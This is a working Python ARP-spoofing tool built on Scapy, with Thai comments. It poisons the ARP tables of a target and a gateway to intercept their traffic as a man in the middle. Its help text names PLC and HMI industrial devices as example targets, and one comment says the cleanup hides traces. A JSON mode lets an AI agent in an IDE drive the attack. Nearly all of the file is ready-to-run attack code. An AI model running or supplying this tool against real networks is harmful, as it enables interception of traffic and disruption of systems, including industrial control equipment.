#!/usr/bin/env python3
"""
===================================================================
🏴‍☠️ SMART ARP SPOOFER (MITM & AI-READY) 🏴‍☠️
===================================================================
# วิธีใช้ (Usage Examples):

# 1. รันโหมดปกติ (เครื่องมือจะเตือนถ้าลืมเปิด IP Forwarding)
sudo python3 arp_spoof.py --target 192.168.1.100 --gateway 192.168.1.1 --iface eth0

# 2. รันผ่าน Trae IDE (พ่นผลลัพธ์เป็น JSON สำหรับ AI)
sudo python3 arp_spoof.py --target 10.10.10.5 --gateway 10.10.10.1 --json
===================================================================
"""
import argparse
import sys
import time
import os
import json
import logging

# ปิดแจ้งเตือนกวนใจของ Scapy
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import Ether, ARP, srp, send, conf

# --- ANSI Colors ---
G = '\033[92m'
Y = '\033[93m'
R = '\033[91m'
C = '\033[96m'
W = '\033[0m'

def check_ip_forwarding(is_json: bool):
    """ตรวจสอบว่าเครื่องเปิด IP Forwarding หรือยัง (ป้องกันการทำ DoS โดยไม่ตั้งใจ)"""
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            if f.read().strip() == '0':
                if not is_json:
                    print(f"{R}[!] WARNING: IP Forwarding is DISABLED!{W}")
                    print(f"{Y}[*] You are about to cause a Denial of Service (DoS) instead of MitM.{W}")
                    print(f"[*] To fix this, run: {C}sudo sysctl -w net.ipv4.ip_forward=1{W}")
                    response = input(f"{Y}Do you want to continue anyway? (y/N): {W}")
                    if response.lower() != 'y':
                        sys.exit(1)
                else:
                    print(json.dumps({"error": "IP Forwarding is disabled. Enable it first to avoid DoS."}))
                    sys.exit(1)
            else:
                if not is_json:
                    print(f"{G}[+] IP Forwarding is ENABLED. You are good to go!{W}")
    except FileNotFoundError:
        # ไม่ใช่ Linux (เช่น Windows/Mac) จะข้ามการเช็คไป
        pass

def get_mac(ip: str) -> str:
    """ฟังก์ชันหา MAC Address ที่เสถียรที่สุด (Layer 2 Broadcast)"""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip), timeout=2, verbose=0)
    if ans:
        return ans[0][1].hwsrc
    return None

def arp_spoof(target_ip: str, gateway_ip: str, target_mac: str, gateway_mac: str):
    """ส่ง ARP พิษหลอกทั้งสองฝั่ง"""
    # หลอกเป้าหมายว่า เราคือ Gateway
    arp_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    # หลอก Gateway ว่า เราคือเป้าหมาย
    arp_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

    send(arp_target, verbose=0)
    send(arp_gateway, verbose=0)

def restore_arp(target_ip: str, gateway_ip: str, target_mac: str, gateway_mac: str):
    """คืนค่า ARP Table กลับเป็นปกติ (ป้องกันร่องรอย)"""
    arp_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, hwsrc=gateway_mac)
    arp_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=target_mac)

    send(arp_target, count=5, verbose=0)
    send(arp_gateway, count=5, verbose=0)

def main():
    parser = argparse.ArgumentParser(description="Smart ARP Spoofer (MitM)")
    parser.add_argument("--target", required=True, help="Target IP address (e.g., PLC or HMI)")
    parser.add_argument("--gateway", required=True, help="Gateway IP address (or Server IP)")
    parser.add_argument("--iface", help="Network interface to use")
    parser.add_argument("--json", action="store_true", help="Output JSON for Trae IDE")
    args = parser.parse_args()

    if args.iface:
        conf.iface = args.iface

    ai_report = {
        "status": "success",
        "target_ip": args.target,
        "gateway_ip": args.gateway,
        "target_mac": "",
        "gateway_mac": "",
        "error_msg": ""
    }

    if not args.json:
        print(f"\n{C}=================================================={W}")
        print(f"{C} 🏴‍☠️ SMART ARP SPOOFER (MITM ENGINE) 🏴‍☠️ {W}")
        print(f"{C}=================================================={W}")
        
    check_ip_forwarding(args.json)

    if not args.json: print(f"[*] Resolving MAC addresses...")
    
    target_mac = get_mac(args.target)
    gateway_mac = get_mac(args.gateway)

    if not target_mac or not gateway_mac:
        if args.json:
            ai_report["status"] = "error"
            ai_report["error_msg"] = "Could not resolve MAC addresses. Target might be down or not in the same subnet."
            print(json.dumps(ai_report, indent=2))
        else:
            print(f"{R}[-] Error: Could not resolve MAC addresses.{W}")
            if not target_mac: print(f"    - Missing Target MAC ({args.target})")
            if not gateway_mac: print(f"    - Missing Gateway MAC ({args.gateway})")
        sys.exit(1)

    ai_report["target_mac"] = target_mac
    ai_report["gateway_mac"] = gateway_mac

    if args.json:
        # พ่น JSON บอก AI ว่าเริ่มทำงานแล้ว
        print(json.dumps(ai_report, indent=2))
        sys.stdout.flush()
    else:
        print(f"{G}[+] Target  : {args.target} ({target_mac}){W}")
        print(f"{G}[+] Gateway : {args.gateway} ({gateway_mac}){W}")
        print(f"\n{Y}[*] Poisoning ARP tables... (Press Ctrl+C to stop){W}")

    try:
        while True:
            arp_spoof(args.target, args.gateway, target_mac, gateway_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        if not args.json:
            print(f"\n{C}[*] Cleaning up and restoring ARP tables...{W}")
        restore_arp(args.target, args.gateway, target_mac, gateway_mac)
        if not args.json:
            print(f"{G}[+] ARP tables restored. Exiting.{W}")

if __name__ == "__main__":
    # บังคับรันด้วย Sudo เท่านั้น
    if os.geteuid() != 0:
        print(f"\033[91m[-] Permission denied. This script requires root/sudo privileges!\033[0m")
        sys.exit(1)
    main()